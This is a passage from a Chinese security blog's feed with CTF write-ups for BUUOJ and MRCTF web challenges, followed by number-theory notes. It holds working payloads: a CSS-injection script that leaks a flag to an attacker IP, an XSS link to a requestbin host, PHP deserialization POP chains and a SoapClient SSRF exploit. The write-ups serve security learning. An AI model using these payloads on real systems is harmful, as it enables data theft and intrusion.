src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200420224644867.png" alt></p></li><li><p>审计<code>utli.php</code>发现</p></li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200420225324470.png" alt></p><p>字符串会被加载到<code>&lt;audio&gt;</code>标签并解析到页面，输入的内容经过一次strip_tags处理。</p><p>没有过滤其他内容，可以在``中插入任意内容，但是受CSP-nonce的限制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$nonce &#x3D; get_nonce();</span><br><span class="line">header(&quot;Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; script-src &#39;nonce-$&#123;nonce&#125;&#39; &#39;strict-dynamic&#39;; base-uri &#39;none&#39;; trusted-types&quot;);</span><br><span class="line">header(&#39;X-Frame-Options: DENY&#39;);</span><br><span class="line">header(&#39;X-XSS-Protection: 1; mode&#x3D;block&#39;);</span><br></pre></td></tr></table></figure><p>而这个<code>strip_tags()</code>存在bug:<a href="https://bugs.php.net/bug.php?id=78814" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78814</a></p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200420230614404.png" alt></p><p><img src="http://static.zybuluo.com/1160307775/5vrpxpsvcopf7bucy1q2y4h1/image_1e2uhu2v810fc1l7ppa4l41mqm20.png" alt="image_1e2uhu2v810fc1l7ppa4l41mqm20.png-53.5kB"></p><p>MusicBlog 中使用的是<code>&lt;audio&gt;</code>作为白名单，<code>&lt;a/udio&gt;</code>可以通过函数处理，并且<code>&lt;a/udio&gt;</code>会作为 超链接<code>&lt;a&gt;</code>被解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;&#x2F;audio&gt;&lt;a&#x2F;udio href&#x3D;&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;vtaf6wvt&quot; id&#x3D;&quot;like&quot;&gt;test&lt;&#x2F;a&#x2F;udio&gt;&lt;audio a&#x3D;</span><br></pre></td></tr></table></figure><p>经过处理后展开是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio controls src&#x3D;&quot;&quot;&gt;&lt;&#x2F;audio&gt;&lt;a&#x2F;udio href&#x3D;&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;vtaf6wvt&quot; id&#x3D;&quot;like&quot;&gt;test&lt;&#x2F;a&#x2F;udio&gt;&lt;audio a&#x3D;&quot;&quot;&gt;&lt;&#x2F;audio&gt;</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://www.hpdoger.cn/2020/03/10/Zer0pts%202020%20CTF-Web%E9%A2%98%E8%A7%A3/#MusicBlog" target="_blank" rel="noopener">https://www.hpdoger.cn/2020/03/10/Zer0pts%202020%20CTF-Web%E9%A2%98%E8%A7%A3/#MusicBlog</a></p><p><a href="https://darkwing.moe/2020/03/10/MusicBlog-zer0pts-CTF-2020/" target="_blank" rel="noopener">https://darkwing.moe/2020/03/10/MusicBlog-zer0pts-CTF-2020/</a></p></blockquote><h3 id="0x-10-安洵杯-2019-cssgame"><a href="#0x-10-安洵杯-2019-cssgame" class="headerlink" title="0x 10 [安洵杯 2019]cssgame"></a>0x 10 [安洵杯 2019]cssgame</h3><ul><li><p>考点</p><p>CSS注入</p></li><li><p>解题过程</p></li></ul><ol><li>打开靶机，显示界面如下：</li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200421222257298.png" alt></p><p>右键查看源代码发现：</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200421222412267.png" alt></p><p>可以看到flag的值就在标签<code>&lt;input&gt;</code>的<code>value</code>属性</p><p>然后我们通过靶机发送<code>css</code>参数给内网的flag.html，flag.html接收后将<code>css</code>拼接到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;$&#123;encodeURI(req.query.css)&#125;&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p>通过<strong>css injection</strong>来窃取内网flag值，这里可以参考微笑师傅的文章：<a href="https://www.smi1e.top/%e9%80%9a%e8%bf%87css%e6%b3%a8%e5%85%a5%e7%aa%83%e5%8f%96html%e4%b8%ad%e7%9a%84%e6%95%b0%e6%8d%ae/" target="_blank" rel="noopener">https://www.smi1e.top/%e9%80%9a%e8%bf%87css%e6%b3%a8%e5%85%a5%e7%aa%83%e5%8f%96html%e4%b8%ad%e7%9a%84%e6%95%b0%e6%8d%ae/</a></p><p>构造exp如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">f &#x3D; open(&quot;poc.css&quot;, &quot;w&quot;)</span><br><span class="line">dic &#x3D; &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;-&quot;</span><br><span class="line">for i in dic:</span><br><span class="line">    flag &#x3D; sys.argv[1] + i</span><br><span class="line">    payload &#x3D; &quot;input[name&#x3D;flag][value^&#x3D;\&quot;&quot; + flag + &quot;\&quot;] ~ * &#123;background-image: url(\&quot;http:&#x2F;&#x2F;174.0.108.172:8080&#x2F;?&quot; + flag + &quot;\&quot;);&#125;&quot;</span><br><span class="line">    f.write(payload + &quot;\n&quot;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>将<code>css=http://174.0.108.172/poc.css</code>post给<code>crawl.html</code>,在nc监听中可以得到flag</p><p>这里环境问题数据可能会传不到内网，需要不停的发包直至收到nc收到请求的信息，坑了我一上午，我裂开了</p><p>参考资料：</p><blockquote><p><a href="https://yanmymickey.github.io/2020/04/17/CTFwp/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Dcssgame/" target="_blank" rel="noopener">https://yanmymickey.github.io/2020/04/17/CTFwp/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Dcssgame/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日&quot;&gt;&lt;a href=&quot;#0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日&quot; class=&quot;headerlink&quot; title=&quot;0x 01 [PWNHUB 公开赛 2018]傻 f
      
    
    </summary>
    
    
      <category term="ctfwp" scheme="http://yoursite.com/categories/ctfwp/"/>
    
    
      <category term="BUUOJ" scheme="http://yoursite.com/tags/BUUOJ/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>MRCTF复盘题解</title>
    <link href="http://yoursite.com/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/</id>
    <published>2020-03-31T00:04:00.000Z</published>
    <updated>2020-04-02T15:46:03.229Z</updated>
    
    <content type="html"><![CDATA[<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="0x-01-Ez-bypass"><a href="#0x-01-Ez-bypass" class="headerlink" title="0x 01 Ez_bypass"></a>0x 01 Ez_bypass</h4><p>第一层数组绕过，第二层弱类型比较绕过</p><h4 id="0x-02-你传你🐎呢"><a href="#0x-02-你传你🐎呢" class="headerlink" title="0x 02 你传你🐎呢"></a>0x 02 你传你🐎呢</h4><p>上传.htaccess绕过</p><h4 id="0x-03-PYWebsite"><a href="#0x-03-PYWebsite" class="headerlink" title="0x 03 PYWebsite"></a>0x 03 PYWebsite</h4><p>XFF伪造127.0.0.1得到flag</p><h4 id="0x-04-Ezpop"><a href="#0x-04-Ezpop" class="headerlink" title="0x 04 Ezpop"></a>0x 04 Ezpop</h4><ol><li><code>__wakeup()</code>方法通过<code>preg_match()</code>将<code>$this-&gt;source</code>做字符串比较，如果<code>$this-&gt;source</code>是<code>Show</code>类，就调用了<code>__toString()</code>方法；</li><li><code>__toString()</code>访问了<code>str</code>的<code>source</code>属性，<code>str</code>是<code>Test</code>类，不存在<code>source</code>属性，就调用了<code>Test</code>类的<code>__get()</code>魔术方法；</li><li><code>__get()</code>方法将<code>p</code>作为函数使用，<code>p</code>实例化为<code>Modify</code>类，就调用了<code>Modifier</code>的<code>__invoke()</code>方法；</li><li><code>__invoke()</code>调用了<code>append()</code>方法，包含<code>$value</code>，若将<code>$value</code>为伪协议，则可读flag.php源码</li></ol><p>exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)&#123;</span><br><span class="line">        $this-&gt;source &#x3D; $file;</span><br><span class="line">        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return &quot;aaa&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p &#x3D; new Modifier();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o &#x3D; new Show(&#39;aaa&#39;);</span><br><span class="line">$o-&gt;str&#x3D; new Test();</span><br><span class="line">$lxj &#x3D; new Show($o);</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($lxj));</span><br></pre></td></tr></table></figure><h4 id="0x-05-套娃"><a href="#0x-05-套娃" class="headerlink" title="0x 05 套娃"></a>0x 05 套娃</h4><ul><li>第一关</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$query &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];</span><br><span class="line"></span><br><span class="line"> if( substr_count($query, &#39;_&#39;) !&#x3D;&#x3D; 0 || substr_count($query, &#39;%5f&#39;) !&#x3D; 0 )&#123;</span><br><span class="line">    die(&#39;Y0u are So cutE!&#39;);</span><br><span class="line">&#125;</span><br><span class="line"> if($_GET[&#39;b_u_p_t&#39;] !&#x3D;&#x3D; &#39;23333&#39; &amp;&amp; preg_match(&#39;&#x2F;^23333$&#x2F;&#39;, $_GET[&#39;b_u_p_t&#39;]))&#123;</span><br><span class="line">    echo &quot;you are going to the next ~&quot;;</span><br></pre></td></tr></table></figure><p>第一层匹配了<code>_</code>符号和它的url编码值，有如下方法绕过：</p><ol><li>%5F</li><li>b.u.p.t（点代替_）</li><li>b u p t（空格代替_）</li></ol><p>第二层换行污染绕过，最终payload：?b.u.p.t=23333%0a</p><ul><li>第二关</li></ul><p>伪造本地访问得到jsfuck提示<code>post me Merak</code>，post一个Merak参数得到源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">include &#39;takeip.php&#39;;</span><br><span class="line">ini_set(&#39;open_basedir&#39;,&#39;.&#39;); </span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;Merak&#39;]))&#123; </span><br><span class="line">    highlight_file(__FILE__); </span><br><span class="line">    die(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function change($v)&#123; </span><br><span class="line">    $v &#x3D; base64_decode($v); </span><br><span class="line">    $re &#x3D; &#39;&#39;; </span><br><span class="line">    for($i&#x3D;0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .&#x3D; chr ( ord ($v[$i]) + $i*2 ); </span><br><span class="line">    &#125; </span><br><span class="line">    return $re; </span><br><span class="line">&#125;</span><br><span class="line">echo &#39;Local access only!&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">$ip &#x3D; getIp();</span><br><span class="line">if($ip!&#x3D;&#39;127.0.0.1&#39;)</span><br><span class="line">echo &quot;Sorry,you don&#39;t have permission!  Your ip is :&quot;.$ip;</span><br><span class="line">if($ip &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39; &amp;&amp; file_get_contents($_GET[&#39;2333&#39;]) &#x3D;&#x3D;&#x3D; &#39;todat is a happy day&#39; )&#123;</span><br><span class="line">echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]);</span><br><span class="line">echo file_get_contents(change($_GET[&#39;file&#39;])); &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>file_get_contents()</code>用<code>data://</code>或者<code>php://input</code>伪协议绕过,根据加密脚本可以编写出dechange函数，得到<code>ZmpdYSZmXGI=</code>，最终发包得到flag</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200401230121454.png" alt></p><h4 id="0x-06-Ezaudit"><a href="#0x-06-Ezaudit" class="headerlink" title="0x 06 Ezaudit"></a>0x 06 Ezaudit</h4><p><a href="http://www.zip源代码泄露，题目类似于GWCTF枯燥的抽奖，根据原题的payload还原出种子，然后手工推算出私钥，最后SQL注入得到flag" target="_blank" rel="noopener">www.zip源代码泄露，题目类似于GWCTF枯燥的抽奖，根据原题的payload还原出种子，然后手工推算出私钥，最后SQL注入得到flag</a></p><h4 id="0x-07-Ezpop-Revenge"><a href="#0x-07-Ezpop-Revenge" class="headerlink" title="0x 07 Ezpop_Revenge"></a>0x 07 Ezpop_Revenge</h4><p>var/Typecho/Plugin.php</p><p>激活插件方法处得到绑定的url</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402223613501.png" alt></p><p>首先根据题意全局搜索unserialize,路径为usr/plugins/HelloWorld/Plugin.php中找到反序列化点</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402214718378.png" alt></p><p>首先看到这里：</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402214946669.png" alt></p><p>找到入口点，跟进Typecho_Db::__construct</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402215208957.png" alt></p><p>存在字符串拼接，全局搜索寻找__tostring()魔术方法</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402215545678.png" alt></p><p>我们选择var/Typecho/Db/Query.php作为跳板</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402215659239.png" alt></p><p>如果$this-&gt;_sqlPreBuild[‘action’]=SELECT就调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild)</span><br></pre></td></tr></table></figure><p>如果令$this-&gt;_adapter为Soapclient实例，触发_call完成ssrf</p><p>pop链构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HelloWorld_DB::wakeup–&gt;</span><br><span class="line">Typecho_Db::__construct(tostring)–&gt;</span><br><span class="line">Typecho_Db_Query::__construct–&gt;</span><br><span class="line">(this-&gt;_adapter&#x3D;new Soapclient)–&gt;</span><br><span class="line">__call()进行ssrf</span><br></pre></td></tr></table></figure><p>exp构造如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloWorld_DB&#123;</span><br><span class="line">    private $coincidence;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;coincidence&#x3D;([&#39;hello&#39;&#x3D;&gt;new Typecho_Db_Query()]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Typecho_Db_Query</span><br><span class="line">&#123;</span><br><span class="line">    private $_sqlPreBuild;</span><br><span class="line">    private $_adapter;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;_sqlPreBuild[&#39;action&#39;]&#x3D;&#39;SELECT&#39;;</span><br><span class="line">        $target &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php&quot;;</span><br><span class="line">        $headers &#x3D; array(</span><br><span class="line">            &#39;Cookie: PHPSESSID&#x3D;ubcj94u08mcaodg4g1e0nooam2&#39;,</span><br><span class="line">        );</span><br><span class="line">        $this-&gt;_adapter&#x3D;new SoapClient(</span><br><span class="line">            null,</span><br><span class="line">            array(&#39;location&#39; &#x3D;&gt; $target,</span><br><span class="line">                &#39;user_agent&#39;&#x3D;&gt;str_replace(&#39;^^&#39;, &quot;\r\n&quot;,&#39;w4nder^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers)),&#39;uri&#39;&#x3D;&gt;&#39;hello&#39;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; serialize(new HelloWorld_DB());</span><br><span class="line">echo base64_encode($a);</span><br></pre></td></tr></table></figure><p>访问/page_admin?admin=1，post提交base64编码的结果得到flag</p><ul><li>后记</li></ul><p>在入口处存在一则过滤，其中过滤了百分号，由于经过base64编码后在解码没有百分号了，所以不需要绕过</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402223309609.png" alt></p><p>假设我们需要绕过%分号该如何绕过呢？答案是需要用\00来代替%00</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在 PHP5 最新的 CVS 中，</span><br><span class="line">新的序列化方式叫做 escaped binary string 方式，这是相对与普通那种 non-escaped binary string 方式来说的：</span><br><span class="line">string 型数据（字符串）新的序列化格式为：</span><br><span class="line">S:&quot;&lt;length&gt;&quot;:&quot;&lt;value&gt;&quot;;</span><br><span class="line">其中 &lt;length&gt; 是源字符串的长度，而非 &lt;value&gt; 的长度。&lt;length&gt; 是非负整数，数字前可以带有正号（+）。&lt;value&gt; 为经过转义之后的字符串。</span><br><span class="line">它的转义编码很简单，对于 ASCII 码小于 128 的字符（但不包括 \），按照单个字节写入（与 s 标识的相同），对于 128~255 的字符和 \ 字符，则将其 ASCII 码值转化为 16 进制编码的字符串，以 \ 作为开头，后面两个字节分别是这个字符的 16 进制编码，顺序按照由高位到低位排列，也就是第 8-5 位所对应的16进制数字字符（abcdef 这几个字母是小写）作为第一个字节，第 4-1 位作为第二个字节。依次编码下来，得到的就是 &lt;value&gt; 的内容了。</span><br></pre></td></tr></table></figure><p>普通的序列化小s对应的就是普通的字符串，如s:3:”%00a%00”;<br> 而序列化的大S则对应的是\加上16进制，如S:2:”\00a\00”。</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402225703750.png" alt></p><p>将不可见字符%00转化为十六进制，大S成功执行wakeup</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402230042727.png" alt></p><p>小写s则失败</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402225923011.png" alt></p><p>转换脚本，参考颖奇师傅的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function decorate($str)</span><br><span class="line">&#123;</span><br><span class="line">    $arr &#x3D; explode(&#39;:&#39;, $str);</span><br><span class="line">    $newstr &#x3D; &#39;&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; count($arr); $i++) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;00&#x2F;&#39;, $arr[$i])) &#123;</span><br><span class="line">            $arr[$i-2] &#x3D; preg_replace(&#39;&#x2F;s&#x2F;&#39;, &quot;S&quot;, $arr[$i-2]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $i &#x3D; 0;</span><br><span class="line">    for (; $i &lt; count($arr) - 1; $i++) &#123;</span><br><span class="line">        $newstr .&#x3D; $arr[$i];</span><br><span class="line">        $newstr .&#x3D; &quot;:&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $newstr .&#x3D; $arr[$i];</span><br><span class="line">    return $newstr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://blog.csdn.net/chasingin/article/details/105189436" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/105189436</a></p><p><a href="https://www.gem-love.com/ctf/2184.html#Ezpop_Revenge" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2184.html#Ezpop_Revenge</a></p><p><a href="https://glotozz.github.io/2020/03/29/Ezpop-Revenge-wp/" target="_blank" rel="noopener">https://glotozz.github.io/2020/03/29/Ezpop-Revenge-wp/</a></p></blockquote><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247484708&amp;idx=1&amp;sn=8ebc3f4f1850da54ab7cb1b1879921e0&amp;chksm=9760f1f2a01778e44b586e45172230db1b2b0da09a3b6c357705e930a43260c244e2aa1ecdb6&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1585840887466&amp;sharer_shareid=7fa312c2aff8bd738bf9d331ff765678#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247484708&amp;idx=1&amp;sn=8ebc3f4f1850da54ab7cb1b1879921e0&amp;chksm=9760f1f2a01778e44b586e45172230db1b2b0da09a3b6c357705e930a43260c244e2aa1ecdb6&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1585840887466&amp;sharer_shareid=7fa312c2aff8bd738bf9d331ff765678#rd</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h3&gt;&lt;h4 id=&quot;0x-01-Ez-bypass&quot;&gt;&lt;a href=&quot;#0x-01-Ez-bypass&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="ctfwp" scheme="http://yoursite.com/categories/ctfwp/"/>
    
    
      <category term="MRCTF" scheme="http://yoursite.com/tags/MRCTF/"/>
    
  </entry>
  
  <entry>
    <title>信息安全数学基础学习笔记</title>
    <link href="http://yoursite.com/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-03-27T15:54:26.000Z</published>
    <updated>2020-04-06T12:44:14.918Z</updated>
    
    <content type="html"><![CDATA[<h3 id="第一章-整数的可除性"><a href="#第一章-整数的可除性" class="headerlink" title="第一章 整数的可除性"></a>第一章 整数的可除性</h3><h4 id="0x-01-广义欧几里得除法-求最大公因数"><a href="#0x-01-广义欧几里得除法-求最大公因数" class="headerlink" title="0x  01 广义欧几里得除法 求最大公因数"></a>0x  01 广义欧几里得除法 求最大公因数</h4><ul><li>基础定理</li></ul><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200331224130106.png" alt></p><ul><li>实现过程</li></ul><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20180410203051218.png" alt></p><ul><li>python代码实现</li></ul><h4 id="0x-02-贝祖（Bezout）等式"><a href="#0x-02-贝祖（Bezout）等式" class="headerlink" title="0x 02 贝祖（Bezout）等式"></a>0x 02 贝祖（Bezout）等式</h4><ul><li>基本定理</li></ul><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401114721981.png" alt></p><ul><li>求解等式</li></ul><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401121714567.png" alt></p><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401121756609.png" alt></p><h4 id="0x-03-最大公因数进一步性质"><a href="#0x-03-最大公因数进一步性质" class="headerlink" title="0x 03 最大公因数进一步性质"></a>0x 03 最大公因数进一步性质</h4><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200401221905664.png" alt></p><h4 id="0x-04-整数的进一步性质"><a href="#0x-04-整数的进一步性质" class="headerlink" title="0x 04 整数的进一步性质"></a>0x 04 整数的进一步性质</h4><p><img 